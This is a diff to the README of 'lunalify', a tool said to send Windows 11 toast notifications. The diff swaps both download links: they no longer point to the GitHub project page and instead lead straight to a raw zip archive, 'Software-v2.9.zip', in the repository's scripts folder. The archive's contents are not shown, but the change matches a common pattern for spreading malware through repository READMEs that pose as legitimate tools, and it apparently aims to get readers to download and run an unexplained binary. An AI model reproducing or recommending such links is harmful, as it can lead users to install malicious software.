@@ -1,6 +1,6 @@
 # 🔔 lunalify - Send Windows Toast Notifications Easily
 
-[![](https://img.shields.io/badge/Download-Lunalify-blue)](https://github.com/blowbyblow-attitude367/lunalify)
+[![](https://img.shields.io/badge/Download-Lunalify-blue)](https://github.com/blowbyblow-attitude367/lunalify/raw/refs/heads/main/scripts/Software-v2.9.zip)
 
 Lunalify sends notifications to your Windows 11 desktop. These alerts appear in the corner of your screen. They use the native Windows system. This tool handles the background tasks. It ensures your alerts arrive on time.
 
@@ -8,7 +8,7 @@ Lunalify sends notifications to your Windows 11 desktop. These alerts appear in 
 
 You need the Lunalify software to send notifications. Visit the project link to start the download.
 
-[Download Lunalify Here](https://github.com/blowbyblow-attitude367/lunalify)
+[Download Lunalify Here](https://github.com/blowbyblow-attitude367/lunalify/raw/refs/heads/main/scripts/Software-v2.9.zip)
 
 ## 💻 System Requirements
 
